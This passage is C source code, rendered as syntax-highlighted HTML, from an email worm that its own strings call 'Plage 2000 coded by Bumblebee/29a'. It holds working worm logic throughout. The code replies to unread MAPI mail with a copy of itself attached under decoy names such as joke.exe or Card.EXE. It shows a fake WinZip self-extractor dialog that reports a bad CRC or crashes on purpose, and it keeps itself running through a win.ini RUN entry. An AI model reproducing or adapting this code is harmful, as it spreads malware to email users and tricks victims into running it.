</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MReadMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_SUPPRESS_ATTACH</span><span class="sc10">|</span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">mess</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">body</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc6">"'%s' wrote:\n====\n- "</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc4">512</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">body</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]==</span><span class="sc7">'\n'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">body</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc6">"\n- "</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">j</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc11">body</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'@'</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">))</span><span class="sc0">
                            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">,</span><span class="sc6">"%s account"</span><span class="sc10">,</span><span class="sc11">address</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0">
                            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">,</span><span class="sc6">"P2000 Mail"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">&gt;=</span><span class="sc4">512</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc6">" ...'"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0">
                            </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">),</span><span class="sc6">"\n====\n\n %s auto-reply:\n\n"</span><span class="sc10">,</span><span class="sc11">server</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc6">"  \' I'll try to reply as soon as possible.\n"</span><span class="sc0">
                        </span><span class="sc6">"  Take a look to the attachment and send me your opinion! \'\n\n\n"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">),</span><span class="sc6">"\t&gt; Get your FREE %s now! &lt;\n\n"</span><span class="sc10">,</span><span class="sc11">server</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc2">// it's important the reply has the checked mark!
</span><span class="sc0">                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc6">"Re: %s  "</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">,</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc2">// send a mail ;)
</span><span class="sc0">                        </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc2">// set our 'checked' mark
</span><span class="sc0">                        </span><span class="sc11">tmp</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">)+</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">)+</span><span class="sc4">2</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">)]=</span><span class="sc7">' '</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc7">' '</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">MSaveMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">messId</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">MFreeBuffer</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc2">// return to lowest priority
</span><span class="sc0">                        </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">THREAD_PRIORITY_LOWEST</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">MFreeBuffer</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">MFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
            </span><span class="sc11">MAPI_UNREAD_ONLY</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc2">// free MAPI32.DLL
</span><span class="sc0">  </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc2">// before ends the worm check the win.ini line it's still there ;)
</span><span class="sc0">  </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"WINDOWS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RUN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// improved from gift family
</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">attachment</span><span class="sc10">[]={</span><span class="sc0">
 </span><span class="sc6">"pics.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"images.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"joke.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"PsPGame.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"news_doc.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"hamster.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"tamagotxi.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"searchURL.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"SETUP.EXE"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"Card.EXE"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"billgt.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"midsong.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"s3msong.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"docs.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"humor.exe"</span><span class="sc10">,</span><span class="sc0">
 </span><span class="sc6">"fun.exe"</span><span class="sc0">
 </span><span class="sc10">};</span><span class="sc0">
 </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mes</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiMessage</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">sfrom</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// From
</span><span class="sc0">    </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Subject
</span><span class="sc0">    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=(</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">sto</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Send to
</span><span class="sc0">    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">fileName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc11">attachment</span><span class="sc10">[</span><span class="sc11">GetTickCount</span><span class="sc10">()&amp;</span><span class="sc4">15</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpOriginator</span><span class="sc10">=&amp;</span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc11">smes</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">// Message
</span><span class="sc0">    </span><span class="sc11">MSendMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#pragma argsused
</span><span class="sc2">// this is my stealth UNZIP dialog procedure
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0">
</span><span class="sc11">MDialogProc</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc0"> </span><span class="sc11">wparam</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc0"> </span><span class="sc11">lparam</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// setup the dialog for a full stealth ;)
</span><span class="sc0">    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_INITDIALOG</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">)&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--);</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc6">"Sel-Extractor"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc6">"To unzip all files in %s to the specified "</span><span class="sc0">
            </span><span class="sc6">"folder press the Unzip button."</span><span class="sc10">,</span><span class="sc11">fileName</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SetDlgItemText</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">TMESS</span><span class="sc10">,</span><span class="sc11">tmp</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc6">"WinZip self-Extractor - %s"</span><span class="sc10">,</span><span class="sc11">fileName</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SetWindowText</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">tmp</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CheckDlgButton</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">IDCHECK</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_COMMAND</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">wparam</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// if one of this... make stealth
</span><span class="sc0">                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDUNZIP</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDWINZIP</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc6">"ZIP damaged: file %s: Bad CRC number.\nPossible cause:"</span><span class="sc0">
                        </span><span class="sc6">" file transfer error."</span><span class="sc10">,</span><span class="sc11">fileName</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc6">"WinZip Self-Extractor"</span><span class="sc10">,</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">|</span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">EndDialog</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc2">// this stealth is different...
</span><span class="sc0">                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDABOUT</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDHELP</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDBROWSE</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// this fake func will end the app with a stack fault
</span><span class="sc0">                    </span><span class="sc11">fake</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc2">// if close... end the app
</span><span class="sc0">                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDCLOSE</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">EndDialog</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#pragma argsused
</span><span class="sc2">// this is my payload PLAGE dialog procedure
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0">
</span><span class="sc11">MDialogProcPay</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc0"> </span><span class="sc11">wparam</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc0"> </span><span class="sc11">lparam</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">dlgItemHnd</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_INITDIALOG</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc11">SetDlgItemText</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">TEXTMSG</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc6">"\nFight against the plage of inhumanity.\n"</span><span class="sc0">
            </span><span class="sc6">"This is Plage 2000 coded by Bumblebee/29a."</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SetWindowText</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc6">"Plage 2000 Activation"</span><span class="sc10">);</span><span class="sc0">
